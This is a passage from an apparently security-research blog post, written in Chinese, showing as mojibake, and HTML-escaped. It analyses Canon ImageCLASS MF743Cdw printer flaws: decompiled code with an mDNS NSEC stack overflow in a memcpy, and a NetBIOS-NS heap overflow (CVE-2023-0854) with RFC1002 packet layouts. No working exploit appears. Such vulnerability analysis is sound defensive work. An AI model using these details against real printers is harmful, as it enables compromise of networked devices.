      &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsGetDecodedRRNameLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;consume_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------- [1]  stack overflow &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•¶ä»–åœ¨è™•ç† NSEC(47) çš„ Record æ™‚ï¼Œä¸¦æ²’æœ‰æª¢æŸ¥é•·åº¦å°±ç›´æ¥è¤‡è£½ data åˆ° local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsec_buf[256]&lt;/code&gt;) ï¼Œå¦‚ä¸Šè¿°ç¨‹å¼ç¢¼çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;ï¼Œå°è‡´ stack overflow&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;é€™è£¡åˆ©ç”¨æ–¹æ³•èˆ‡ Pwn2Own 2021 Austin æ™‚&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;ç›¸åŒ&lt;/a&gt;ï¼Œé€™é‚Šå°±ä¸åœ¨å¤šåšæ•˜è¿°ã€‚&lt;/p&gt;

&lt;h4 id=&quot;netbios-cve-2023-0854&quot;&gt;NetBIOS (CVE-2023-0854)&lt;/h4&gt;

&lt;p&gt;åœ¨ NetBIOS ä¸­ä¸»è¦æä¾›ä¸‹åˆ—ä¸‰ç¨®ä¸åŒçš„æœå‹™:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Name service (NetBIOS-NS) : Port 137/TCP and 137/UDP&lt;/li&gt;
  &lt;li&gt;Datagram distribution service (NetBIOS-DGM) : Port 138/UDP&lt;/li&gt;
  &lt;li&gt;Session service (NetBIOS-SSN) : Port 139/TCP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™é‚Šæˆ‘å€‘å°‡æœƒæŠŠé‡é»æ”¾åœ¨ NetBIOS-NS ä¸­ï¼ŒNetBIOS-NS ä¹Ÿæœƒæä¾›å€ç¶²ä¸­åŸŸåè§£æçš„æœå‹™ï¼Œå¸¸è¦‹æ–¼ Windows ä½œæ¥­ç³»çµ±ä¸­ï¼Œè€Œè©²å°åŒ…æ ¼å¼ä¹Ÿæ˜¯åŸºæ–¼ DNS çš„å°åŒ…ã€‚å…¶è©³ç´°å…§å®¹å®šç¾©æ–¼ &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt; ä¸­&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         NAME_TRN_ID           | OPCODE  |   NM_FLAGS  | RCODE |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          QDCOUNT              |           ANCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          NSCOUNT              |           ARCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è€Œ Query å‰‡æœƒè¢«æ”¾åœ¨ header ä¹‹å¾Œ&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   + ------                                                ------- +
   |                            HEADER                             |
   + ------                                                ------- +
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                       QUESTION ENTRIES                        /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                    ANSWER RESOURCE RECORDS                    /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                  AUTHORITY RESOURCE RECORDS                   /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                  ADDITIONAL RESOURCE RECORDS                  /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­æˆ‘å€‘åªé ˆé—œæ³¨æ–¼ Question Entries æ¬„ä½&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question Section:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                         QUESTION_NAME                         /
   /                                                               /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         QUESTION_TYPE         |        QUESTION_CLASS         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Question Name éƒ½æ˜¯ç”±è¨±å¤š label çµ„æˆï¼Œæ¯å€‹ label éƒ½å¦‚åŒå‰è¿° LLMNR æ‰€è¿°ï¼Œéƒ½æ˜¯é•·åº¦åŠ ä¸Šå­—ä¸²çš„çµ„åˆã€‚å…¶é¤˜æ¬„ä½å‰‡ä¸å¦å¤–å¤šåŠ æ•˜è¿°ï¼Œè©³ç´°å…§å®¹å¯åƒè€ƒ &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æ¼æ´ä½ç½®&lt;/strong&gt;
ç•¶ Canon ImageCLASS MF743Cdw åœ¨è™•ç† NetBIOS å°åŒ…çš„ Question æ¬„ä½æ™‚ï¼Œæ²’æœ‰æ­£ç¢ºæª¢æŸ¥é•·åº¦å°è‡´ Heap Overflow ã€‚&lt;/p&gt;

&lt;p&gt;å…¶æ¼æ´ä½ç½®åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; ä¸­ï¼Œæˆ‘å€‘å¯é€é ndNameProcessExternalMessage è§¸ç™¼ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é€™é‚Šå°±ç¨å¾®ä¾†åˆ†æä¸€ä¸‹æ¼æ´æˆå› :&lt;/p&gt;

&lt;p&gt;ç•¶ Canon ä¸­çš„ NetBIOS æœå‹™å•Ÿå‹•æ™‚ï¼Œæœƒå…ˆå»åˆå§‹åŒ– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt; ï¼Œä¸¦åˆ†é… 0xff å¤§å°ç©ºé–“çµ¦è©² bufferã€‚&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•¶æ¥æ”¶åˆ°ä¾†è‡ª 137/UDP çš„ NetBIOS å°åŒ…æ™‚ï¼Œå°±æœƒé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage &lt;/code&gt; ä¾†è™•ç†å°åŒ…&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameProcessExternalMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
